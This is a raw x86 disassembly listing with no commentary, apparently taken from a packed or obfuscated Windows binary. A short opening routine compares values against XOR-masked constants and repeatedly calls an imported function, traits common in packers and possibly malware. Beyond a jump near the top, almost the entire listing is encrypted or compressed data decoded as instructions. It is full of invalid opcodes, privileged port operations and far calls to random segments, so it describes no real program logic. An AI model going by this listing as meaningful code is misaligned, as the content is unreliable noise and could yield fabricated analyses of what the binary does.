  41d46f:	xor    edi,edi
  41d471:	xor    esi,0x8a29a147
  41d477:	xor    ebx,0x0
  41d47a:	mov    eax,ecx
  41d47c:	add    eax,0xfabdbecd
  41d481:	adc    edi,0xffffffff
  41d484:	xor    eax,0x8a29a147
  41d489:	xor    edi,0x0
  41d48c:	cmp    eax,esi
  41d48e:	jne    0x41d42f
  41d494:	cmp    edi,ebx
  41d496:	jne    0x41d42f
  41d49c:	mov    eax,0xf89c85b4
  41d4a1:	pop    ebx
  41d4a2:	pop    edi
  41d4a3:	pop    esi
  41d4a4:	leave  
  41d4a5:	ret    0xc
  41d4a8:	push   ebp
  41d4a9:	mov    ebp,esp
  41d4ab:	push   ecx
  41d4ac:	and    DWORD PTR ds:0x426e8d,0x0
  41d4b6:	mov    eax,ds:0x426e8d
  41d4bb:	inc    eax
  41d4bc:	mov    ds:0x426e8d,eax
  41d4c1:	cmp    DWORD PTR ds:0x426e8d,0x1c
  41d4c8:	jge    0x41d4eb
  41d4ce:	jmp    0x41d4de
  41d4d3:	push   0x5eb6
  41d4d8:	call   DWORD PTR ds:0x42fa3c
  41d4de:	cmp    DWORD PTR ds:0x426e8d,0x1a
  41d4e5:	jb     0x41d4b6
  41d4eb:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41d4f2:	neg    DWORD PTR ds:0x426e9d
  41d4f8:	mov    eax,DWORD PTR [ebp+0x8]
  41d4fb:	or     ecx,edx
  41d4fd:	movsx  eax,BYTE PTR [eax]
  41d500:	sub    ecx,ecx
  41d502:	jmp    0x41f875
  41d507:	ret    0x203
  41d50a:	add    BYTE PTR [edx-0x7e],0x42
  41d50e:	inc    ebx
  41d50f:	cmc    
  41d510:	in     al,0x42
  41d512:	sub    BYTE PTR [eax-0x9],al
  41d515:	and    al,BYTE PTR [edx]
  41d517:	(bad)  
  41d518:	(bad)  
  41d519:	jp     0x41d596
  41d51b:	rcr    DWORD PTR [ebx+edi*2+0x5b2b237b],1
  41d522:	sub    edx,esi
  41d524:	pop    eax
  41d525:	jo     0x41d4ef
  41d527:	xchg   esp,eax
  41d528:	push   ds
  41d529:	jne    0x41d4dc
  41d52b:	addr16 jmp 0x2957:0x7e930569
  41d533:	outs   dx,DWORD PTR ds:[esi]
  41d534:	aam    0x86
  41d536:	mov    WORD PTR [edi-0x74fd4785],?
  41d53c:	aaa    
  41d53d:	mov    edx,0xc563abd9
  41d542:	jecxz  0x41d51e
  41d544:	adc    DWORD PTR [eax],esi
  41d546:	push   ds
  41d547:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d548:	call   0xdbbe:0xe2431909
  41d54f:	push   ss
  41d550:	loop   0x41d4ef
  41d552:	fmulp  st(6),st
  41d554:	dec    ecx
  41d555:	push   0x49
  41d557:	iret   
  41d558:	jo     0x41d53c
  41d55a:	or     al,BYTE PTR gs:[ebx+0x3]
  41d55e:	add    al,BYTE PTR [ebx]
  41d560:	and    ah,BYTE PTR [esi+ecx*1]
  41d563:	fmul   QWORD PTR [eax]
  41d565:	fst    DWORD PTR ds:0x438606c6
  41d56b:	jns    0x41d540
  41d56d:	sub    DWORD PTR [esi+0x486e4d9b],esp
  41d573:	pop    ss
  41d574:	pop    ecx
  41d575:	add    edi,DWORD PTR [edx-0x3b]
  41d578:	in     al,dx
  41d579:	shl    BYTE PTR [ecx+0x7cd7929c],cl
  41d57f:	sub    DWORD PTR [eax],eax
  41d581:	xchg   BYTE PTR [esp+esi*1],cl
  41d584:	jg     0x41d5cf
  41d586:	add    eax,0x152b0692
  41d58b:	and    DWORD PTR [esi-0x4c7673b3],esp
  41d591:	jne    0x41d51d
  41d593:	xchg   esp,eax
  41d594:	(bad)  
  41d595:	add    ecx,DWORD PTR cs:[ecx+0xb64de42]
  41d59c:	push   ebp
  41d59d:	and    BYTE PTR [esp+ecx*8+0x25b9af7],bh
  41d5a4:	xchg   edx,eax
  41d5a5:	cmp    al,0xbe
  41d5a7:	add    eax,0xc4a0f1bd
  41d5ac:	mov    BYTE PTR ds:0xb547ed1d,bh
  41d5b2:	int3   
  41d5b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b4:	mov    esp,0x5b830a38
  41d5b9:	jae    0x41d5a2
  41d5bb:	xor    ebp,DWORD PTR [ecx-0x40]
  41d5be:	cmp    ch,BYTE PTR ds:0x72c507
  41d5c4:	lods   al,BYTE PTR fs:[esi]
  41d5c6:	mov    al,ds:0x64a51628
  41d5cb:	jns    0x41d5d0
  41d5cd:	push   eax
  41d5ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5cf:	push   esp
  41d5d0:	push   ebp
  41d5d1:	mov    DWORD PTR [ecx-0x4cb06fc4],eax
  41d5d7:	mov    esp,0x145f6cac
  41d5dc:	sub    BYTE PTR [ecx+0x6e],dh
  41d5df:	imul   ebp,ebx,0xa
  41d5e2:	inc    ebp
  41d5e3:	test   BYTE PTR [esi-0x5fa85891],0x66
  41d5ea:	in     al,0xae
  41d5ec:	jo     0x41d603
  41d5ee:	jno    0x41d583
  41d5f0:	pop    ebx
  41d5f1:	les    ecx,FWORD PTR [ebx]
  41d5f3:	leave  
  41d5f4:	loop   0x41d5ef
  41d5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5f8:	xor    BYTE PTR [edx],ch
  41d5fa:	je     0x41d615
  41d5fc:	jne    0x41d61a
  41d5fe:	add    edi,DWORD PTR [eax-0x12]
  41d601:	sar    BYTE PTR [edi-0x72],cl
  41d604:	ins    BYTE PTR es:[edi],dx
  41d605:	add    ebx,edx
  41d607:	mov    dl,0xa5
  41d609:	jbe    0x41d5c2
  41d60b:	loop   0x41d5a2
  41d60d:	addr16 cdq 
  41d60f:	sub    BYTE PTR [edi],dh
  41d611:	adc    eax,0xa152487f
  41d616:	dec    esp
  41d617:	outs   dx,DWORD PTR ds:[esi]
  41d618:	mov    ds:0xb7eb43cb,al
  41d61d:	pop    esp
  41d61e:	(bad)  
  41d61f:	adc    al,0x95
  41d621:	js     0x41d5d2
  41d623:	sti    
  41d624:	cmp    al,0x3f
  41d626:	and    eax,0xb7a65813
  41d62b:	leave  
  41d62c:	fdivr  DWORD PTR [esi-0x22d4c8ad]
  41d632:	jno    0x41d632
  41d634:	cmp    DWORD PTR [esi+ebp*1-0x7c],eax
  41d638:	adc    ebp,DWORD PTR [ecx+0x1e]
  41d63b:	sti    
  41d63c:	leave  
  41d63d:	shl    DWORD PTR [edi+0x32fd69d7],1
  41d643:	pop    ebx
  41d644:	fs out dx,al
  41d646:	dec    ebx
  41d647:	xchg   dx,ax
  41d649:	in     eax,dx
  41d64a:	lods   eax,DWORD PTR ds:[esi]
  41d64b:	test   al,0x79
  41d64d:	mov    bl,0xda
  41d64f:	popf   
  41d650:	mov    cl,0x8a
  41d652:	fisubr WORD PTR [ecx]
  41d654:	mov    DWORD PTR [esi-0x391d706f],0xa6b8b58e
  41d65e:	pop    esp
  41d65f:	mov    ds:0x8d93a4de,eax
  41d664:	jp     0x41d673
  41d666:	out    dx,eax
  41d667:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d668:	mov    ds,WORD PTR [edx]
  41d66a:	push   esi
  41d66b:	dec    ecx
  41d66c:	lea    esi,[edi+0x1612ff74]
  41d672:	daa    
  41d673:	stos   DWORD PTR es:[edi],eax
  41d674:	mov    edi,0x58b4e6b2
  41d679:	aam    0x73
  41d67b:	and    bl,dl
  41d67d:	loopne 0x41d648
  41d67f:	dec    edx
  41d680:	mov    dl,0x32
  41d682:	pop    eax
  41d683:	daa    
  41d684:	in     eax,dx
  41d685:	loopne 0x41d64b
  41d687:	lock jno 0x41d6a1
  41d68a:	xor    esp,ecx
  41d68c:	mov    ch,BYTE PTR [ebx-0x31452ab2]
  41d692:	cmp    al,0xc1
  41d694:	fwait
  41d695:	add    DWORD PTR [ebx],edi
  41d697:	jne    0x41d6fd
  41d699:	or     ebx,DWORD PTR [ebx-0x6ea563d8]
  41d69f:	scas   al,BYTE PTR es:[edi]
  41d6a0:	mov    eax,ds:0xef145383
  41d6a5:	or     al,BYTE PTR [edx+0x5cf55b04]
  41d6ab:	(bad)  
  41d6ac:	and    eax,0xcd44e946
  41d6b1:	add    bl,BYTE PTR [edx]
  41d6b3:	mov    esp,0x3be9b742
  41d6b8:	arpl   cx,si
  41d6ba:	sbb    al,0xfe
  41d6bc:	and    al,0xd9
  41d6be:	jae    0x41d6a5
  41d6c0:	fs rol edx,1
  41d6c3:	ins    BYTE PTR es:[edi],dx
  41d6c4:	cli    
  41d6c5:	iret   
  41d6c6:	xor    eax,DWORD PTR [edi]
  41d6c8:	cmp    al,0x74
  41d6ca:	mov    dl,0x5c
  41d6cc:	fstp   TBYTE PTR [ecx+0x54]
  41d6cf:	push   edx
  41d6d0:	add    BYTE PTR [ebx-0x4e],cl
  41d6d3:	loop   0x41d6bc
  41d6d5:	adc    ch,BYTE PTR fs:[eax-0x16]
  41d6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6da:	inc    esp
  41d6db:	xlat   BYTE PTR ds:[ebx]
  41d6dc:	pop    es
  41d6dd:	or     dh,ah
  41d6df:	push   ss
  41d6e0:	push   esp
  41d6e1:	out    dx,al
  41d6e2:	push   ss
  41d6e3:	mov    BYTE PTR [esi],al
  41d6e5:	inc    ecx
  41d6e6:	(bad)  
  41d6e7:	ss jge 0x41d747
  41d6ea:	inc    ecx
  41d6eb:	inc    ebx
  41d6ec:	imul   ebx,DWORD PTR [ebx+0x42cfce8b],0xc58d151f
  41d6f6:	nop
  41d6f7:	sahf   
  41d6f8:	mov    ah,0x5b
  41d6fa:	jbe    0x41d70c
  41d6fc:	dec    edx
  41d6fd:	fidiv  WORD PTR [edx+0x3fa002db]
  41d703:	jae    0x41d759
  41d705:	lds    esp,FWORD PTR [edi+0x7c]
  41d708:	cmp    dh,BYTE PTR [edi-0x423466a5]
  41d70e:	enter  0xdf15,0x9d
  41d712:	call   0x46ca:0x2d3a2a0d
  41d719:	and    dh,ah
  41d71b:	sbb    edx,edi
  41d71d:	int    0x30
  41d71f:	sub    DWORD PTR [ebp+0x4d],0x3569df54
  41d726:	hlt    
  41d727:	out    0xe2,eax
  41d729:	es inc edx
  41d72b:	(bad)  
  41d72c:	xchg   DWORD PTR [ecx],edx
  41d72e:	test   DWORD PTR [ecx+esi*1],ecx
  41d731:	push   ebp
  41d732:	aad    0x1b
  41d734:	add    al,0xaf
  41d736:	xor    DWORD PTR [edi-0x57],edi
  41d739:	fwait
  41d73a:	int3   
  41d73b:	or     eax,0x3e664569
  41d740:	and    ebx,DWORD PTR [ecx+0x4fa990d]
  41d746:	pushf  
  41d747:	mov    bh,0xb1
  41d749:	push   0x61acac05
  41d74e:	mov    bl,0x15
  41d750:	js     0x41d7b9
  41d752:	mov    al,0x5a
  41d754:	dec    eax
  41d755:	dec    ebp
  41d756:	into   
  41d757:	int    0xba
  41d759:	test   DWORD PTR [ebx+0x47],edi
  41d75c:	inc    ecx
  41d75d:	mov    BYTE PTR [ecx],0x2b
  41d760:	(bad)  
  41d761:	mov    dh,0xa8
  41d763:	call   0x755c6836
  41d768:	mov    ch,BYTE PTR [ebx]
  41d76a:	sar    BYTE PTR [ebx-0x633296bf],0xd2
  41d771:	cmp    al,0x67
  41d773:	cmovb  edi,DWORD PTR cs:[ebp+0x68]
  41d778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d779:	add    al,al
  41d77b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d77c:	imul   dx,WORD PTR [edx+0x3],0x66bc
  41d782:	mov    ecx,0x7099ecc2
  41d787:	test   al,0x55
  41d789:	leave  
  41d78a:	cmc    
  41d78b:	test   al,0x15
  41d78d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d78e:	mov    dl,0xd0
  41d790:	adc    al,0x57
  41d792:	and    al,BYTE PTR [edx-0x8]
  41d795:	out    dx,al
  41d796:	inc    ecx
  41d797:	add    ebx,ebp
  41d799:	addr16 push cs
  41d79b:	mov    edi,DWORD PTR [ecx-0x29]
  41d79e:	mov    bh,0xdd
  41d7a0:	cmp    esp,DWORD PTR [esi+0x12]
  41d7a3:	sti    
  41d7a4:	add    eax,0xb0699db4
  41d7a9:	inc    esi
  41d7aa:	and    eax,0x8224e97e
  41d7af:	push   esp
  41d7b0:	add    dl,bl
  41d7b2:	add    ah,0xb7
  41d7b5:	jnp    0x41d7b5
  41d7b7:	mov    esp,0xe419689
  41d7bc:	into   
  41d7bd:	(bad)  [eax]
  41d7bf:	mov    dh,BYTE PTR [eax+0x471896c8]
  41d7c5:	pop    ebp
  41d7c6:	and    edx,0xffffff89
  41d7c9:	xchg   edx,eax
  41d7ca:	js     0x41d829
  41d7cc:	scas   eax,DWORD PTR es:[edi]
  41d7cd:	es mov al,0xac
  41d7d0:	loop   0x41d7f5
  41d7d2:	test   eax,0xe32750ef
  41d7d7:	sbb    ah,BYTE PTR gs:[eax]
  41d7da:	xchg   ebx,eax
  41d7db:	outs   dx,DWORD PTR ds:[esi]
  41d7dc:	dec    eax
  41d7de:	(bad)  
  41d7df:	or     DWORD PTR [edi],edi
  41d7e1:	mov    ah,BYTE PTR [ecx]
  41d7e3:	mov    al,0xd9
  41d7e5:	push   eax
  41d7e6:	jecxz  0x41d7c5
  41d7e8:	out    dx,eax
  41d7e9:	add    DWORD PTR [ecx],ecx
  41d7eb:	inc    edx
  41d7ec:	push   ecx
  41d7ed:	js     0x41d808
  41d7ef:	inc    ebp
  41d7f0:	popa   
  41d7f1:	in     eax,0xdd
  41d7f3:	lods   eax,DWORD PTR ds:[esi]
  41d7f4:	and    al,0x76
  41d7f6:	mov    DWORD PTR ds:0xefc46007,edx
  41d7fc:	inc    eax
  41d7fd:	iret   
  41d7fe:	pop    eax
  41d7ff:	xor    bh,BYTE PTR [eax]
  41d801:	int3   
  41d802:	inc    eax
  41d803:	and    esi,DWORD PTR [eax]
  41d805:	mov    dh,0x44
  41d807:	or     ah,BYTE PTR [ebx-0x72]
  41d80a:	bound  esp,QWORD PTR [ecx+0x33ed380a]
  41d810:	in     eax,0x82
  41d812:	ror    edi,cl
  41d814:	retf   
  41d815:	nop
  41d816:	aam    0xe7
  41d818:	scas   eax,DWORD PTR es:[edi]
  41d819:	pusha  
  41d81a:	pop    esi
  41d81b:	and    eax,0x484458f
  41d820:	popf   
  41d821:	sbb    DWORD PTR [esi+0x44e13339],edi
  41d827:	mov    al,ds:0x8377b8dc
  41d82c:	out    dx,al
  41d82d:	daa    
  41d82e:	inc    edi
  41d82f:	sbb    BYTE PTR cs:[eax],0xbc
  41d833:	in     al,0x83
  41d835:	mov    eax,ds:0x5c3a4ea4
  41d83a:	jecxz  0x41d829
  41d83c:	pop    esi
  41d83d:	ret    0x975a
  41d840:	push   eax
  41d841:	adc    al,0xc5
  41d843:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d844:	aam    0xc7
  41d846:	add    DWORD PTR [ecx+0x49eacb7e],0x41
  41d84d:	fisttp QWORD PTR [eax+0x4a]
  41d850:	stc    
  41d851:	sbb    BYTE PTR [ecx],bl
  41d853:	mov    esi,0x4400c6dd
  41d858:	sub    dl,BYTE PTR [ebx+0x1]
  41d85b:	jg     0x41d812
  41d85d:	ins    DWORD PTR es:[edi],dx
  41d85e:	or     ah,al
  41d860:	jae    0x41d817
  41d862:	mov    al,ds:0x7a7abee7
  41d867:	or     BYTE PTR [edx+0x41],dh
  41d86a:	scas   eax,DWORD PTR es:[edi]
  41d86b:	inc    eax
  41d86c:	ds aas 
  41d86e:	lahf   
  41d86f:	(bad)  
  41d870:	dec    esp
  41d871:	inc    esi
  41d872:	add    eax,0x353003b5
  41d877:	adc    eax,0x5aea7f97
  41d87c:	push   esi
  41d87d:	cmp    al,0x23
  41d87f:	cmp    edx,edx
  41d881:	mov    ebx,0x550bbd3b
  41d886:	xor    al,0xbc
  41d888:	out    dx,al
  41d889:	int3   
  41d88a:	add    edi,DWORD PTR [ebx-0x58ae3d33]
  41d890:	pop    esi
  41d891:	and    BYTE PTR [edx],cl
  41d893:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d894:	dec    ebp
  41d895:	test   ebp,esp
  41d897:	mov    esi,DWORD PTR [edx-0x3f3ceb39]
  41d89d:	mov    cr4,esp
  41d8a0:	jmp    DWORD PTR [ebx+0x4]
  41d8a3:	lahf   
  41d8a4:	ja     0x41d8f2
  41d8a6:	inc    edi
  41d8a7:	cwde   
  41d8a8:	and    bh,BYTE PTR [ecx+0x2]
  41d8ab:	fcom   QWORD PTR [ebx]
  41d8ad:	fwait
  41d8ae:	clc    
  41d8af:	rcr    cl,1
  41d8b1:	mov    BYTE PTR [edi+0x55],ah
  41d8b4:	mov    ebx,0x59e163a4
  41d8b9:	je     0x41d8d0
  41d8bb:	sub    esi,DWORD PTR [edi-0x14]
  41d8be:	or     edx,DWORD PTR [ebx+0x1249bc9d]
  41d8c4:	imul   DWORD PTR [edx-0x1]
  41d8c7:	or     edx,0xa4ef734b
  41d8cd:	jmp    0x64705ae0
  41d8d2:	jle    0x41d888
  41d8d4:	rol    BYTE PTR [edi],cl
  41d8d6:	push   DWORD PTR [edx-0x7309bc4f]
  41d8dc:	hlt    
  41d8dd:	shl    DWORD PTR [ecx-0x732a1b46],1
  41d8e3:	mov    eax,0xd70c9329
  41d8e8:	or     edx,DWORD PTR [ebx-0x32c9233a]
  41d8ee:	mov    cl,0xcf
  41d8f0:	dec    ebx
  41d8f1:	xchg   DWORD PTR [edi],ecx
  41d8f3:	cmp    cl,dl
  41d8f5:	dec    esi
  41d8f6:	jbe    0x41d902
  41d8f8:	fnclex 
  41d8fa:	inc    ecx
  41d8fb:	cmp    eax,0xb2806959
  41d900:	es je  0x41d8bd
  41d903:	aaa    
  41d904:	loopne 0x41d92b
  41d906:	repz push cs
  41d908:	dec    esp
  41d909:	fidiv  DWORD PTR ds:0xf284b318
  41d90f:	les    ebp,FWORD PTR [ecx-0x76]
  41d912:	sub    ebx,esi
  41d914:	mov    ecx,0x38bae78a
  41d919:	cs test eax,0x83f69227
  41d91f:	pop    esp
  41d920:	repz sub cl,0xba
  41d924:	lahf   
  41d925:	pusha  
  41d926:	sbb    DWORD PTR [ebp+0x64d24c92],0x8baa8a38
  41d930:	(bad)  
  41d932:	(bad)  
  41d933:	cmp    al,0x2f
  41d935:	mov    dl,BYTE PTR [edx+0x41454e1d]
  41d93b:	retf   0xe1fe
  41d93e:	pusha  
  41d93f:	aam    0x4c
  41d941:	fld    DWORD PTR [edi]
  41d943:	mov    ebp,0x45f416bb
  41d948:	es pop esp
  41d94a:	dec    edx
  41d94b:	cmc    
  41d94c:	inc    ebp
  41d94d:	jo     0x41d8f8
  41d94f:	mov    ecx,DWORD PTR [ebx-0x6b82b080]
  41d955:	adc    bh,0x93
  41d958:	xor    ebx,esp
  41d95a:	xor    DWORD PTR [ebp+0x4cc57a89],edi
  41d960:	inc    edx
  41d961:	cmp    edi,DWORD PTR [ebx+0x4b]
  41d964:	clc    
  41d965:	xor    dl,0x35
  41d968:	xchg   esp,eax
  41d969:	pop    esi
  41d96a:	adc    dl,BYTE PTR [ecx-0x66ecf375]
  41d970:	adc    al,BYTE PTR [eax+0x398b8572]
  41d976:	adc    eax,0x4dcca240
  41d97b:	or     eax,0xd85208e1
  41d980:	imul   edi,DWORD PTR [ebx],0x3c
  41d983:	push   ecx
  41d984:	cmovl  edi,DWORD PTR [ebx+0x12]
  41d988:	and    DWORD PTR [edx-0x61],edx
  41d98b:	or     ah,ah
  41d98d:	mov    ds:0x19da1c34,eax
  41d992:	jns    0x41d98a
  41d994:	je     0x41d988
  41d996:	fisttp QWORD PTR [ebx+0x2fd85e1e]
  41d99c:	mov    edx,0x39e51d80
  41d9a1:	and    cl,BYTE PTR ds:0xe12dcbe4
  41d9a7:	imul   ebx,DWORD PTR [edi+0x7e],0xffffffba
  41d9ab:	sub    eax,0xfc678a91
  41d9b0:	mov    dl,0xeb
  41d9b2:	bound  edx,QWORD PTR [ecx-0x6f]
  41d9b5:	cmp    cl,BYTE PTR [edi+0x73]
  41d9b8:	push   ds
  41d9b9:	lds    esi,FWORD PTR [edi-0xfa92a38]
  41d9bf:	scas   eax,DWORD PTR es:[edi]
  41d9c0:	xor    DWORD PTR [edx+eiz*2+0x5d9d4f4c],edx
  41d9c7:	fsub   DWORD PTR [ebx]
  41d9c9:	dec    edi
  41d9ca:	stos   DWORD PTR es:[edi],eax
  41d9cb:	sub    BYTE PTR [ebx+0x50],ah
  41d9ce:	mul    edx
  41d9d0:	pusha  
  41d9d1:	jge    0x41da09
  41d9d3:	ret    0x5226
  41d9d6:	pop    ebp
  41d9d7:	sbb    ebp,edi
  41d9d9:	es or  al,0x3e
  41d9dc:	jne    0x41d9c1
  41d9de:	lods   eax,DWORD PTR ds:[esi]
  41d9df:	mov    ds:0xb14bff1f,eax
  41d9e4:	lahf   
  41d9e5:	(bad)  
  41d9e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9e7:	inc    DWORD PTR [ebp-0x45]
  41d9ea:	pop    ss
  41d9eb:	fs jle 0x41d994
  41d9ee:	call   0xaa81:0x952df12c
  41d9f5:	lea    ebp,[eax]
  41d9f7:	pop    ecx
  41d9f8:	in     al,dx
  41d9f9:	mov    ebx,0x3554e45c
  41d9fe:	bound  esp,QWORD PTR [ebx+0x4eb8e981]
  41da04:	xchg   BYTE PTR [edx],bh
  41da06:	and    edx,DWORD PTR ds:0x800833d0
  41da0c:	mov    ecx,0xdf99b02
  41da11:	arpl   WORD PTR [edi+0x62],bx
  41da14:	xchg   ebp,eax
  41da15:	inc    esi
  41da16:	push   edx
  41da17:	mov    ?,WORD PTR [edx-0x149520fb]
  41da1d:	or     dl,BYTE PTR [esi]
  41da1f:	jle    0x41da71
  41da21:	and    BYTE PTR [edi-0x3eceaf8a],bl
  41da27:	cmp    eax,0x4429c7a5
  41da2c:	mov    ds:0xf8159eaa,eax
  41da31:	les    esi,FWORD PTR [ecx+eax*2]
  41da34:	dec    ecx
  41da35:	sbb    BYTE PTR [edi+0x78a6cc85],dh
  41da3b:	push   ebx
  41da3c:	dec    esp
  41da3d:	or     al,0xf2
  41da3f:	loop   0x41da50
  41da41:	out    0xd2,eax
  41da43:	(bad)  
  41da44:	sbb    ecx,DWORD PTR [esi+0x11]
  41da47:	cli    
  41da48:	cs pop ecx
  41da4a:	adc    eax,0xd0d00c74
  41da4f:	jp     0x41dabd
  41da51:	fdivr  QWORD PTR [ecx-0x3606d8b1]
  41da57:	inc    ecx
  41da58:	inc    esi
  41da59:	nop
  41da5a:	mov    ch,0xd5
  41da5c:	nop
  41da5d:	pop    esi
  41da5e:	nop
  41da5f:	and    ebx,DWORD PTR [ecx]
  41da61:	inc    esp
  41da62:	sti    
  41da63:	or     eax,0x25475795
  41da68:	cmp    BYTE PTR [esi+ebp*1+0x525d5523],dl
  41da6f:	cwde   
  41da70:	pop    es
  41da71:	mov    esi,0x92ce27c2
  41da76:	lods   al,BYTE PTR ds:[esi]
  41da77:	cld    
  41da78:	push   edx
  41da79:	cwde   
  41da7a:	mov    ebp,0x93473e93
  41da7f:	push   esi
  41da80:	addr16 push edx
  41da82:	pop    esi
  41da83:	mov    eax,0xd3706a71
  41da88:	(bad)  
  41da89:	sub    eax,0x6724b33f
  41da8e:	ins    DWORD PTR es:[edi],dx
  41da8f:	hlt    
  41da90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da91:	lds    ebx,FWORD PTR [eax-0x3f907ac9]
  41da97:	push   esi
  41da98:	leave  
  41da99:	call   0xe149:0xa76dd8c7
  41daa0:	mov    ds:0x47b0b387,eax
  41daa5:	shl    DWORD PTR [ecx+0x772bba07],0x86
  41daac:	shl    BYTE PTR [ecx],cl
  41daae:	mov    esi,0xe0bab204
  41dab3:	lds    eax,FWORD PTR [edx-0x1272b73c]
  41dab9:	mov    DWORD PTR [ecx+0x802cc1a],ebp
  41dabf:	and    BYTE PTR [ecx+0x1abc3301],dl
  41dac5:	cmp    esi,DWORD PTR [esi+0xe03f4e7]
  41dacb:	aad    0xcc
  41dacd:	les    ecx,FWORD PTR [edx+0x8]
  41dad0:	mov    ebp,0x9512fdf
  41dad5:	(bad)  
  41dad7:	enter  0x184e,0xa2
  41dadb:	popa   
  41dadc:	out    0x9d,al
  41dade:	xchg   esi,eax
  41dadf:	retf   0xdab6
  41dae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dae3:	in     eax,dx
  41dae4:	add    eax,0x92ccea41
  41dae9:	dec    edx
  41daea:	mov    dl,0xcd
  41daec:	outs   dx,DWORD PTR ds:[esi]
  41daed:	inc    esp
  41daee:	fmul   DWORD PTR [ebx]
  41daf0:	aaa    
  41daf1:	or     DWORD PTR [esp+ebx*4+0x53],esi
  41daf5:	ss dec eax
  41daf7:	cmp    DWORD PTR [edi-0xf],ecx
  41dafa:	lods   al,BYTE PTR ds:[esi]
  41dafb:	repz jne 0x41dac1
  41dafe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41daff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db00:	mov    cl,BYTE PTR [edi]
  41db02:	scas   al,BYTE PTR es:[edi]
  41db03:	ror    ch,1
  41db05:	sub    ebp,esi
  41db07:	mov    WORD PTR [ebp-0x6413ecc6],ss
  41db0d:	lock sar edi,cl
  41db10:	fisttp QWORD PTR [esi]
  41db12:	mov    ds:0x1199f831,al
  41db17:	dec    edx
  41db18:	fidivr WORD PTR [edx+0x718c2fbc]
  41db1e:	sahf   
  41db1f:	stos   DWORD PTR es:[edi],eax
  41db20:	leave  
  41db21:	sub    BYTE PTR [ecx],0x53
  41db24:	push   edx
  41db25:	fs mov ebp,0x52125c7b
  41db2b:	dec    edi
  41db2c:	cld    
  41db2d:	shl    DWORD PTR [esi+0x7e],1
  41db30:	aam    0x7a
  41db32:	dec    ecx
  41db33:	cmp    DWORD PTR [edx+0xc31ac45],ecx
  41db39:	call   0xf4ea:0x73900662
  41db40:	fild   WORD PTR [ebp+ebp*1+0x1bb94a1b]
  41db47:	std    
  41db48:	sub    al,0xfa
  41db4a:	jmp    0xc3b2:0x87e8ac0b
  41db51:	in     al,0x33
  41db53:	mov    ebx,0xe4f9b266
  41db58:	int3   
  41db59:	pop    ebx
  41db5a:	popa   
  41db5b:	aam    0x50
  41db5d:	aas    
  41db5e:	xor    BYTE PTR [edi],0xc0
  41db61:	les    ecx,FWORD PTR [ecx]
  41db63:	(bad)  
  41db64:	mov    BYTE PTR [eax+ebx*1-0x709b4daa],ah
  41db6b:	jecxz  0x41db54
  41db6d:	xchg   ebx,eax
  41db6e:	ret    
  41db6f:	test   BYTE PTR [ebx-0x49],bh
  41db72:	push   edi
  41db73:	hlt    
  41db74:	dec    edx
  41db75:	rol    edx,1
  41db77:	and    edi,DWORD PTR [edi-0x4bd677a8]
  41db7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db7e:	outs   dx,DWORD PTR ds:[esi]
  41db7f:	aas    
  41db80:	sbb    ecx,DWORD PTR [edi]
  41db82:	pop    es
  41db83:	mov    ecx,0xcbe3deb6
  41db88:	out    0x71,eax
  41db8a:	ror    BYTE PTR [ebp+0x4944f90e],cl
  41db90:	jmp    0xc3b31ed5
  41db95:	shl    BYTE PTR [ebp+edi*8+0x1e54c41c],0x2b
  41db9d:	ds aas 
  41db9f:	mov    DWORD PTR [edx-0x41],0x1004b1e3
  41dba6:	mov    eax,0x1e3fe457
  41dbab:	adc    cl,bh
  41dbad:	pop    esp
  41dbae:	(bad)  
  41dbaf:	jbe    0x41db33
  41dbb1:	cmc    
  41dbb2:	add    eax,0xe9e0a8fe
  41dbb7:	sbb    al,0x8c
  41dbb9:	xchg   esi,eax
  41dbba:	push   eax
  41dbbb:	and    al,0x46
  41dbbd:	clc    
  41dbbe:	mov    WORD PTR [ebx],di
  41dbc1:	mov    edx,0x3ecb9976
  41dbc6:	cld    
  41dbc7:	pop    es
  41dbc8:	jg     0x41dbeb
  41dbca:	leave  
  41dbcb:	dec    ebx
  41dbcc:	inc    eax
  41dbcd:	fadd   DWORD PTR [edx-0x7001fe50]
  41dbd3:	xor    eax,0x98e0a621
  41dbd8:	leave  
  41dbd9:	xor    edx,ebx
  41dbdb:	mov    bh,0xbb
  41dbdd:	rol    ebp,1
  41dbdf:	scas   eax,DWORD PTR es:[edi]
  41dbe0:	imul   edi,DWORD PTR [edi-0x2ec0a644],0xe4cb08d9
  41dbea:	push   0x14
  41dbec:	fdiv   QWORD PTR [edi]
  41dbee:	jg     0x41dc30
  41dbf0:	arpl   sp,cx
  41dbf2:	xchg   esp,eax
  41dbf3:	ret    
  41dbf4:	bound  edi,QWORD PTR [eax]
  41dbf6:	or     DWORD PTR [ecx-0x54],ebx
  41dbf9:	mov    ebx,0xdd80f90e
  41dbfe:	xor    eax,0xae396359
  41dc03:	adc    esp,DWORD PTR ds:0xa78051cb
  41dc09:	push   ds
  41dc0a:	mov    bl,0xc4
  41dc0c:	ja     0x41dbcb
  41dc0e:	push   esp
  41dc0f:	retf   0xe69c
  41dc12:	aas    
  41dc13:	nop
  41dc14:	out    dx,eax
  41dc15:	mov    edi,0x4b0d1908
  41dc1a:	call   DWORD PTR [esi]
  41dc1c:	sbb    eax,0x45d81f7b
  41dc21:	cmp    BYTE PTR [edi],cl
  41dc23:	test   DWORD PTR [edx+0x366c4a94],edi
  41dc29:	call   0xb4f16a46
